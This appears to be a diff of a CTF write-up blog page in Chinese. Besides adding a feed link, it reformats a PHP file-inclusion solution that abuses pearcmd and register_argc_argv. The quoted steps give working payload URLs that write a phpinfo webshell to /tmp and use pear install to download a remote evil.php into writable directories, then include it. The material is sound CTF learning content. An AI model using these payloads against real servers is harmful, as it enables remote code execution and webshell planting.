@@ -48,7 +48,8 @@
           font-size: 1.6rem;
         }
       </style>
-    </head>
+    <link rel="alternate" href="/atom.xml" title="n0rt6's blog" type="application/atom+xml">
+</head>
   </html>
 </html>
 
@@ -269,12 +270,12 @@
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>先包含phpinfo.php文件看看<br>搜索flag发现提示<code>register_argc_argv</code><br><img src="https://img-blog.csdnimg.cn/b99c8a88c07a4e6286d25ca285e74158.png" alt="456"><br>找找有没有相关漏洞，恰好找到了一篇文章：<a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">registerargcargv与include to RCE的巧妙组合</a></p>
 <blockquote>
-<p>&#x2F;&#x2F;通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将&lt; ? &gt; 转义<br>&#x2F;&#x2F; config-create可以直接创建配置文件，且第一个参数必须以&#x2F;开头<br><a href="http://ip:port/include.php?f=pearcmd&amp;+config-create+/">http://ip:port/include.php?f=pearcmd&amp;+config-create+/</a><?=phpinfo();?>+&#x2F;tmp&#x2F;evil.php<br>&#x2F;&#x2F; 通过远程直接下载webshell<br>&#x2F;&#x2F; web目录可写</p>
+<p>&#x2F;&#x2F;通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将&lt; ? &gt; 转义<br>&#x2F;&#x2F; config-create可以直接创建配置文件，且第一个参数必须以&#x2F;开头<br><code>http://ip:port/include.php?f=pearcmd&amp;+config-create+/&lt;?=phpinfo();?&gt;+/tmp/evil.php</code><br>&#x2F;&#x2F; 通过远程直接下载webshell<br>&#x2F;&#x2F; web目录可写</p>
 <ul>
-<li><a href="http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php">http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</a></li>
-<li><a href="http://ip:port/tmp/pear/download/evil.php">http://ip:port/tmp/pear/download/evil.php</a><br>&#x2F;&#x2F; tmp目录可写</li>
-<li><a href="http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php">http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</a></li>
-<li><a href="http://ip:port/include.php?f=/tmp/pear/download/evil">http://ip:port/include.php?f=/tmp/pear/download/evil</a></li>
+<li><code>http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</code></li>
+<li><code>http://ip:port/tmp/pear/download/evil.php</code><br>&#x2F;&#x2F; tmp目录可写</li>
+<li><code>http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</code></li>
+<li><code>http://ip:port/include.php?f=/tmp/pear/download/evil</code></li>
 </ul>
 </blockquote>
 <p><img src="https://img-blog.csdnimg.cn/7d3cce3881de4f9a89bc8e659bf3f395.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/66e920198f60410f8ba08d44e18bb64f.png" alt="789"><br>然后访问<code>/tmp/pear/download/1.php</code>发现成功传入<br><img src="https://img-blog.csdnimg.cn/1daa56ab972347a98aa42ad9931a2d1a.png" alt="456"></p>
